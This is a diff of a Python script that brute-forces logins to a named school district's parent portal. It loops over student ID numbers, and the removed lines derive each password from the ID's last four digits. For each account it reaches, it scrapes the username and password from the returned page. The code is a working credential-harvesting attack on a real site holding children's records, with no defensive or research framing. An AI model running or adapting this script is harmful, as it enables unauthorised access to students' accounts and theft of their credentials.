@@ -42,8 +42,6 @@ for x in range(4624021140, 4699999999):
     br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
     br.select_form(nr=0)
     user.studentid = str(x)
-    userpass = user.studentid[6] + user.studentid[7] + \
-        user.studentid[8] + user.studentid[9]
 
     # Set bruteforce combo
     br.form['wrkuser'] = user.studentid
@@ -61,7 +59,6 @@ for x in range(4624021140, 4699999999):
         # Retrieve redirect url embedded in js code
         soup = BeautifulSoup(br.response().read(), 'lxml')
         formatted = str(soup)
-        print(soup)
         newUrl = downwithit(
             formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
         br.open("https://dashboard.okaloosaschools.com" + newUrl)
@@ -71,7 +68,6 @@ for x in range(4624021140, 4699999999):
         tempCombo = []
         for span in soup.select("td span"):
             tempCombo.append(span.text)
-        print(tempCombo)
         user.username = tempCombo[0]
         user.password = tempCombo[1]
 
